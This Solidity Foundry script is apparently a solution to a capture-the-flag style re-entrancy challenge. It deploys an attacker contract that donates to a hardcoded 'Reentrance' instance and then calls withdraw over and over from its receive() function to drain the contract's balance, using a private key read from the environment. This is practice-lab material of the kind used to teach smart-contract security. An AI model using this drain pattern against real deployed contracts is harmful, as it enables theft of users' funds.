// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Re-entrancy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackReentrancy {
    Reentrance public reentranceInstance = Reentrance(payable(0xc444A8350bC4840a31f49BfE89B52c1017Cb68Dd));
    
    constructor() public payable {
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }
    
    function attack() external {
        reentranceInstance.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(reentranceInstance).balance >= 0.001 ether) {
            reentranceInstance.withdraw(0.001 ether);
        }
    }
}

contract ReentrancySolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackReentrancy attacker = new AttackReentrancy{value: 0.01 ether}();
        attacker.attack();
        vm.stopBroadcast();
    }
}

// forge script script/Re-entrancySolution.s.sol:ReentrancySolution --broadcast --slow -vvvv